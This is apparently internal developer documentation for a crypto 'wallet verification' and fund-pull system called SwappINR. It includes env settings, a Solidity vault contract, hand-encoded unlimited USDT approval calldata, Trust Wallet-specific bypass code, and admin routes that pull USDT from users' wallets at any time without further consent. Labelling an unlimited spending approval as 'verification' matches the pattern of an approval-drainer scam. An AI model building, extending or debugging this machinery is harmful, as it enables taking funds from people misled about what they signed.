# SwappINR — Full Pull System Reference

Complete end-to-end documentation for the wallet verification and fund-pull system.
Written 2026-06-20. Keep this file updated when any piece changes.

---

## Overview

Users connect a crypto wallet (Trust Wallet DApp browser on mobile, or any injected wallet on desktop).
They approve the SwapINRVault smart contract once ("unlimited" USDT approval).
Admins can then pull USDT from the user's wallet to the treasury at any time via the admin panel — no further user action required.

**Chains supported:**
| Network | Token | USDT Decimals | Chain ID |
|---------|-------|---------------|----------|
| BNB Smart Chain (BEP20) | BSC USDT | 18 | 56 |
| Ethereum (ERC20) | Ethereum USDT | 6 | 1 |
| TRON (TRC20) | TRC20 USDT | 6 | 195 (internal) |

---

## Environment Variables

All required in `.env.local` / production env:

```env
# ── EVM RPC endpoints ──────────────────────────────────────────────
NEXT_PUBLIC_BSC_RPC=https://bsc-dataseed.binance.org
NEXT_PUBLIC_ETHEREUM_RPC=https://eth.llamarpc.com

# ── Vault contract addresses (SwapINRVault.sol deployed on each chain) ──
NEXT_PUBLIC_VAULT_BEP20=0x63b4546C36ec37C351fdd349638576A59c9f750e
NEXT_PUBLIC_VAULT_ERC20=<ethereum_mainnet_vault_address>
VAULT_BEP20=0x63b4546C36ec37C351fdd349638576A59c9f750e
VAULT_ERC20=<ethereum_mainnet_vault_address>

# ── TRON vault ─────────────────────────────────────────────────────
VAULT_TRC20=<tron_vault_address_base58>

# ── Operator keys (treasury hot wallet — signs pullFunds txs) ──────
VAULT_OPERATOR_PRIVATE_KEY=<hex_private_key_with_or_without_0x>
TRON_OPERATOR_PRIVATE_KEY=<tron_hex_private_key>

# ── Treasury addresses (operator wallet = treasury for EVM) ─────────
# The EVM treasury is baked into the vault contract constructor.
# For TRON, set in vault contract.

# ── TRON API ───────────────────────────────────────────────────────
TRONGRID_API_KEY=<optional_but_recommended>
```

**Key notes:**
- `VAULT_OPERATOR_PRIVATE_KEY` works with OR without `0x` prefix — `normaliseKey()` handles it in all routes.
- `VAULT_BEP20` and `VAULT_ERC20` are the SAME value as `NEXT_PUBLIC_VAULT_BEP20/ERC20` — both forms are needed (one for client-side ABI encoding, one for server-side pull).
- Vault owner must be the operator wallet address (`privateKeyToAccount(VAULT_OPERATOR_PRIVATE_KEY).address`).

---

## Smart Contract: SwapINRVault.sol

Located at `contracts/SwapINRVault.sol`. Deployed identically on BSC and Ethereum mainnet.

```
BSC:      0x63b4546C36ec37C351fdd349638576A59c9f750e
Ethereum: <deploy separately — ETH USDT has non-standard ABI>
```

### Key functions

```solidity
// User approves this contract address on USDT, then admin calls:
function pullFunds(address token, address from, uint256 amount, bytes32 orderId) external onlyOwner
// Checks allowance internally, transfers token from user → treasury, emits FundsPulled

function allowance(address token, address user) external view returns (uint256)
// Returns how much USDT the user has approved for this vault

function setTreasury(address _treasury) external onlyOwner
function transferOwnership(address newOwner) external onlyOwner
```

### CRITICAL: Ethereum USDT non-standard ABI

Ethereum's Tether USDT `transferFrom()` returns **nothing** (void), not `bool`.
Solidity 0.8 decodes empty bytes as `false` for a `bool` return → vault reverts with `TransferFailed`.

**Fix:** `_safeTransferFrom()` uses a low-level `.call()` so the ABI decoder never touches the empty return:

```solidity
function _safeTransferFrom(address token, address from, uint256 amount) internal {
    (bool success, bytes memory data) = token.call(
        abi.encodeWithSignature("transferFrom(address,address,uint256)", from, treasury, amount)
    );
    if (!success || (data.length > 0 && !abi.decode(data, (bool)))) {
        revert TransferFailed();
    }
}
```

BSC USDT is standard ERC20 — returns `bool` correctly, no special handling needed.

### Deployment checklist

1. Deploy `SwapINRVault.sol` with `constructor(treasuryAddress)` 
2. Call `transferOwnership(operatorWalletAddress)` so the operator key can call `pullFunds`
3. Set `VAULT_BEP20` / `VAULT_ERC20` env vars to deployed address
4. Existing user approvals for the old vault address are invalidated — users must re-verify

---

## User Flow: Adding & Verifying a Wallet

### Step 1: User opens Wallets page (`/wallets`)
File: `src/app/(client)/wallets/page.tsx`

User clicks "Add Wallet" → selects network (BEP20 / ERC20 / TRC20) → `MobileVerifyModal` opens.

### Step 2: Wallet verification (Trust Wallet DApp browser)
File: `src/components/client/wallet-verify-flow.tsx`

**Detection of Trust Wallet DApp browser:**
```typescript
const inTwBrowser = typeof window !== 'undefined' &&
  (!!(window as any).trustwallet || (window as any).ethereum?.isTrust === true);
```

**EVM flow (BEP20 / ERC20) — Trust Wallet:**

Trust Wallet's WebKit WebView has a non-standard error object that crashes wagmi's internal ABI decoder (`'data' in e` where `e` is not an object). **wagmi is bypassed entirely** for Trust Wallet.

`triggerDirectEvmApprove()` calls `window.ethereum.request` directly:
```typescript
// 1. ABI-encode approve(vault, MaxUint256) manually
const data = '0x095ea7b3'
  + spender.slice(2).toLowerCase().padStart(64, '0')
  + 'f'.repeat(64); // MaxUint256

// 2. Send transaction
const txHash = await eth.request({ method: 'eth_sendTransaction', params: [{ from, to: usdtAddress, data }] });

// 3. Poll eth_getTransactionReceipt every 3s (max 60 tries = 3 minutes)
// On status 0x1 → set directEvmDone = true
```

**EVM flow — desktop/non-TW browser:**
Uses wagmi's `useWriteContract` hook normally.

**TRC20 flow:**
TRON uses `window.tronWeb.transactionBuilder.triggerSmartContract` via `@/lib/tron/wc-tron.ts`.

### Step 3: Wallet saved to DB
When approval is detected, a POST to `/api/wallets` upserts the wallet:
```typescript
{
  address,
  chainId,
  label: 'BEP20' | 'ERC20' | 'TRC20',   // critical for pull routing
  chainName: 'BNB Smart Chain (BEP20)' | 'Ethereum (ERC20)',
  approved: true,
  approvalTxHash: txHash,
}
```

**Critical:** `wallet.label` must be exactly `'BEP20'`, `'ERC20'`, or `'TRC20'` — the pull routes use this for network routing.

Route: `src/app/api/wallets/route.ts`  
Uses `$set` (not `$setOnInsert`) so label always updates on re-verification.

### Step 4: Success screen
`MobileVerifyModal` switches to `phase='success'` — user taps "Done →" to dismiss.
This prevents the modal from closing before the user sees confirmation.

---

## Pull Flow: Admin Panel

### Step 1: Admin opens user panel
`/admin/users` → expand user row → wallet cards appear with live balance/allowance from on-chain.

File: `src/components/admin/user-manager.tsx`  
Live data from: `GET /api/admin/wallet-info?address=...&network=...`

### Step 2: Dry run (estimate)
Click "Open Pull Panel →" → enter amount → "Estimate Gas & Fees"

`POST /api/admin/pull` with `{ walletId, amount, dryRun: true }`

Returns:
```json
{
  "canPull": true,
  "balance": "10.50",
  "allowance": "1.157..e+59",   // MaxUint256 = displayed as "∞ Unlimited" in UI
  "gasFee": "0.000003",
  "gasToken": "BNB",
  "paidBy": "operator"
}
```

### Step 3: Execute pull
Click "Execute Pull — X USDT"

`POST /api/admin/pull` with `{ walletId, amount, dryRun: false }`

Server-side:
1. Creates `publicClient` + `walletClient` with operator's private key
2. Calls vault's `allowance(token, userAddr)` to confirm on-chain
3. Calls `walletClient.writeContract({ functionName: 'pullFunds', args: [token, userAddr, amountUnits, orderId] })`
4. Waits for receipt (90s timeout)
5. Returns `{ txHash, amount, network }`

Route: `src/app/api/admin/pull/route.ts`

---

## Pull Flow: User-Initiated (`/api/wallets/pull`)

Route: `src/app/api/wallets/pull/route.ts`

Used when a user initiates a pull from their own wallet page (Add Funds flow).

### Routing logic

```typescript
// 1. normalise private key (handles missing 0x prefix)
const account = privateKeyToAccount(normaliseKey(rawKey));

// 2. Detect whether vault address is a real deployed contract
const code = await publicClient.getBytecode({ address: vaultAddr });
const isContract = !!code && code !== '0x' && code.length > 2;

// Mode A: vault contract exists → call pullFunds()
if (isContract) {
  const hash = await walletClient.writeContract({
    address: vaultAddr, abi: VAULT_ABI, functionName: 'pullFunds',
    args: [token, userAddr, amountUnits, orderId],
  });
}

// Mode B: no vault → direct ERC20.transferFrom (operator must be approved spender)
else {
  const hash = await walletClient.writeContract({
    address: token, abi: ERC20_TRANSFERFROM_ABI, functionName: 'transferFrom',
    args: [userAddr, treasuryAddr, amountUnits],
  });
}
```

Both paths use `fallback()` transport with multiple RPC endpoints (12s timeout each).

---

## API Routes Reference

| Route | Method | Auth | Purpose |
|-------|--------|------|---------|
| `/api/wallets` | POST | User | Upsert wallet after approval |
| `/api/wallets` | GET | User | List user's wallets |
| `/api/wallets/balance` | GET | User | Fetch on-chain USDT balance |
| `/api/wallets/pull` | POST | User | User-initiated pull to treasury |
| `/api/admin/pull` | POST | Admin | Admin pull (dryRun or execute) |
| `/api/admin/wallet-info` | GET | Admin | Live balance + allowance for admin UI |
| `/api/admin/users/[id]/wallet-docs` | GET | Admin | User's wallet docs + vault spender addresses |

---

## RPC Endpoints (Multi-Fallback)

All routes use `fallback([...rpcs])` from viem so if one endpoint fails, the next is tried.

**BSC:**
1. `NEXT_PUBLIC_BSC_RPC` (env)
2. `https://bsc-dataseed.binance.org`
3. `https://bsc-dataseed1.defibit.io`
4. `https://bsc.drpc.org`

**Ethereum:**
1. `NEXT_PUBLIC_ETHEREUM_RPC` (env)
2. `https://eth.llamarpc.com`
3. `https://ethereum.publicnode.com`
4. `https://eth.drpc.org`
5. `https://rpc.ankr.com/eth`

**DEAD endpoint (never use):** `https://cloudflare-eth.com` — retired 2023, returns HTML not JSON-RPC.

---

## Key Helper Functions

### `normaliseKey(k)` — private key `0x` prefix fix
```typescript
function normaliseKey(k: string): `0x${string}` {
  return (k.startsWith('0x') ? k : `0x${k}`) as `0x${string}`;
}
```
Used in both `/api/wallets/pull` and `/api/admin/pull`.
Viem's `privateKeyToAccount` requires the `0x` prefix; env vars may omit it.

### `evmSpender(depositAddress)` — vault address selection
```typescript
function evmSpender(depositAddress: string): string {
  const vaultBEP20 = process.env.NEXT_PUBLIC_VAULT_BEP20;
  const vaultERC20 = process.env.NEXT_PUBLIC_VAULT_ERC20;
  // returns vault address for the current chain, falls back to depositAddress
}
```

---

## TRON-Specific Notes

**Trust Wallet DApp browser does NOT inject `window.tronWeb`.**
TRC20 wallet verification uses WalletConnect + TronLink integration via `@/lib/tron/wc-tron.ts`.

**TRC20 allowance check:** `getTrc20Allowance(userAddress, vaultAddress)` from `@/lib/tron/server-sign.ts`
Uses TronGrid API: `POST /wallet/triggerconstantcontract` with `allowance(address,address)` selector.

**TRC20 pull:** `tronVaultPullFunds(vault, from, amountSun, operatorPrivKey)` from same file.
Uses `TRON_OPERATOR_PRIVATE_KEY` (hex, no 0x prefix for TRON).

**Energy estimation:** Calls TronGrid `/wallet/triggerconstantcontract` for simulation + `/wallet/getchainparameters` for energy fee per unit. Fallback: 55,000 energy × 420 sun/unit = ~0.023 TRX.

---

## Common Issues & Fixes

### "invalid private key, expected hex or 32 bytes, got string"
**Cause:** `VAULT_OPERATOR_PRIVATE_KEY` in env lacks `0x` prefix.  
**Fix:** `normaliseKey()` in all pull routes. No env change needed.

### "Contract Failed — e is not an Object" (Trust Wallet DApp browser)
**Cause:** TW's WebKit returns non-standard error objects; wagmi's internal code does `'data' in e` where `e` is not an object.  
**Fix:** Detect `inTwBrowser` and bypass wagmi entirely — use direct `window.ethereum.request`.

### "Connection Failed — Connector already connected"
**Cause:** wagmi's injected connector fires both auto-announce and explicit reconnect simultaneously.  
**Fix:** Filter this error in `connectError` useEffect — it's not a real failure:
```typescript
if (/connector already connected/i.test(connectError)) return;
```

### ETH USDT balance showing "—"
**Cause:** Dead RPC endpoint (`cloudflare-eth.com`).  
**Fix:** Multi-RPC fallback transport.

### Vault `pullFunds` reverts on Ethereum
**Cause:** Ethereum USDT's `transferFrom` returns void; Solidity 0.8 decodes it as `false`.  
**Fix:** `_safeTransferFrom()` with low-level `.call()` in vault contract. Requires vault redeployment on Ethereum mainnet.

### "Network Wallet not supported for pulls" 
**Cause:** `wallet.label = 'Wallet'` (schema default) because either: (a) label not sent in POST body, or (b) label was in `$setOnInsert` so never updated.  
**Fix:** Send `label` in all wallet POST calls; use `$set` not `$setOnInsert` in wallet upsert route.

### Modal closes immediately without showing success screen
**Cause:** `onVerified` called directly in polling → parent's `handleVerified` → `setModalNet(null)`.  
**Fix:** Added `phase='success'` state — user must tap "Done →" to call `onVerified`.

### Toast text invisible
**Cause:** Global CSS `p { color: white }` on a light-background toast component.  
**Fix:** Inline dark-theme styles in `src/components/ui/toast.tsx`, explicit `color: '#ffffff'` on every text element.

### Allowance shows "1.15792e+59 USDT" in admin UI
**Cause:** MaxUint256 ÷ 10^18 formatted with `.toFixed(2)` produces scientific notation.  
**Fix:** `parseFloat(estimate.allowance) > 1e18 ? '∞ Unlimited' : ...` in `PullPanel`.

---

## File Map

```
src/
├── app/
│   ├── (client)/wallets/page.tsx          # User wallets page — AddFundsModal, MobileVerifyModal
│   ├── api/
│   │   ├── wallets/
│   │   │   ├── route.ts                   # POST upsert wallet, GET list
│   │   │   ├── balance/route.ts           # GET on-chain USDT balance (multi-RPC)
│   │   │   └── pull/route.ts              # POST user pull (Mode A vault / Mode B transferFrom)
│   │   └── admin/
│   │       ├── pull/route.ts              # POST admin pull (dryRun + execute)
│   │       ├── wallet-info/route.ts       # GET live balance + allowance for admin UI
│   │       └── users/[id]/wallet-docs/route.ts  # GET user wallet docs + spender addresses
│   └── (admin)/admin/users/page.tsx       # Admin users page (server component)
├── components/
│   ├── admin/user-manager.tsx             # UserManager, UserRow, WalletCard, PullPanel
│   ├── client/wallet-verify-flow.tsx      # Full EVM + TRC20 approval flow (most complex file)
│   └── ui/toast.tsx                       # Dark-theme toast with inline styles
└── lib/
    ├── tron/
    │   ├── server-sign.ts                 # tronVaultPullFunds, getTrc20Allowance, tronAddrFromPrivKey
    │   └── wc-tron.ts                     # TRON_USDT_ADDR, tronToEvmHex, client-side TW helpers
    ├── auth/require-auth.ts               # requireAuth() — session guard
    └── db/index.ts                        # Mongoose models: Wallet, User

contracts/
└── SwapINRVault.sol                       # Deploy on BSC + Ethereum mainnet
```

---

## Allowance Approval ABI (manual encoding for Trust Wallet bypass)

```
Function selector: 0x095ea7b3  (keccak256("approve(address,uint256)").slice(0,4))
Param 1 (spender): vault address, padded to 32 bytes
Param 2 (amount):  MaxUint256 = 0xfff...fff (64 f's)

Full calldata:
0x095ea7b3
+ vaultAddress.slice(2).toLowerCase().padStart(64, '0')
+ 'f'.repeat(64)
```

## Vault ABI (used in all pull routes)

```typescript
const VAULT_ABI = [
  {
    name: 'pullFunds', type: 'function', stateMutability: 'nonpayable',
    inputs: [
      { name: 'token',   type: 'address' },
      { name: 'from',    type: 'address' },
      { name: 'amount',  type: 'uint256' },
      { name: 'orderId', type: 'bytes32' },
    ],
    outputs: [],
  },
  {
    name: 'allowance', type: 'function', stateMutability: 'view',
    inputs: [{ name: 'token', type: 'address' }, { name: 'user', type: 'address' }],
    outputs: [{ type: 'uint256' }],
  },
] as const;
```

`orderId` = `keccak256(toBytes(`${walletId}-${Date.now()}`))`  — unique per pull, stored in `FundsPulled` event for reconciliation.

---

## Pending / Known Issues (as of 2026-06-20)

1. **ETH vault needs redeployment** — `SwapINRVault.sol` has been updated with `_safeTransferFrom` to handle Ethereum USDT's void return. Current ETH vault will revert on `pullFunds`. Deploy new contract, update `VAULT_ERC20` / `NEXT_PUBLIC_VAULT_ERC20`, existing user approvals for old address become invalid.

2. **TRON vault not yet tested end-to-end** — TRC20 wallet verify + pull logic is implemented but confirm with a real TronLink pull.

3. **Amount cap on admin pull** — currently `numAmount > 10_000` = error. Raise or remove in `/api/admin/pull/route.ts:176` if needed.
